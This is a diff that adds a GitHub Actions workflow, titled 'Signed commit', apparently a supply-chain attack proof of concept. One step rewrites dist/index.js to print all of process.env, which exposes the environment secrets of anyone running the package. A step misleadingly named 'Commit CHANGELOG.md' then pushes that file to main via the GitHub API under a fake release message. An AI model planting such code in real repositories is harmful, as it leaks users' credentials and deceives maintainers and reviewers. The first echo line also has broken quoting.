@@ -1,0 +1,34 @@
+name: Signed commit
+on:
+  workflow_dispatch:  
+jobs:
+  checkout_and_commit:
+    name: Checkout and commit
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4 # put a hash here
+        
+      - name: Change file
+        run: |
+          echo "console.log("NOPE");" > ./dist/index.js
+          echo "console.log(JSON.stringify(process.env))" >> ./dist/index.js
+          
+      - name: Commit CHANGELOG.md
+        env: 
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          export MESSAGE="Release 1.3.3.7"
+          export DESTINATION_BRANCH="main"
+          export FILE_TO_COMMIT="./dist/index.js"
+          export SHA=$( git rev-parse $DESTINATION_BRANCH:$FILE_TO_COMMIT )
+          export CONTENT=$( base64 -i $FILE_TO_COMMIT )
+          
+          gh api --method PUT /repos/${GITHUB_REPOSITORY}/contents/${FILE_TO_COMMIT} \
+            --field message="$MESSAGE" \
+            --field content="$CONTENT" \
+            --field encoding="base64" \
+            --field branch="$DESTINATION_BRANCH" \
+            --field sha="$SHA"        
